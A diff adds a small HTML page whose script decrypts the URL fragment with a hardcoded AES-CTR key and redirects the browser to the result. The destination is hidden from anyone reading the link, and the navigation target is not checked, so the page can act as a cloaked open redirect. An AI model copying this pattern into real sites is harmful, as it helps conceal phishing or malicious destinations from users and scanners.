@@ -1,0 +1,26 @@
+<html>
+<head>
+<script>
+const getDecryptKey = window.crypto.subtle.importKey("raw", new Uint8Array([235, 202, 87, 50, 226, 2, 209, 44, 168, 114, 10, 12, 161, 81, 228, 192]), {name: "AES-CTR"}, false, ["decrypt"]);
+
+const hashToData = () => new Uint8Array([...atob(decodeURIComponent(location.hash.substring(1)))].map(s => s.charCodeAt(0)));
+
+const decrypt = async (data) => {
+  const key = await getDecryptKey;
+  return window.crypto.subtle.decrypt({name: "AES-CTR", counter: new Uint8Array(16), length: 128}, key, data)
+};
+
+const decryptHash = async () => new Uint8Array(await decrypt(hashToData()));
+
+const hashToURL = async () => {
+  const data = await decryptHash();
+  location.href = [...data].map(i => String.fromCharCode(i)).join('');
+};
+
+hashToURL();
+</script>
+</head>
+<body>
+</body>
+</html>
+
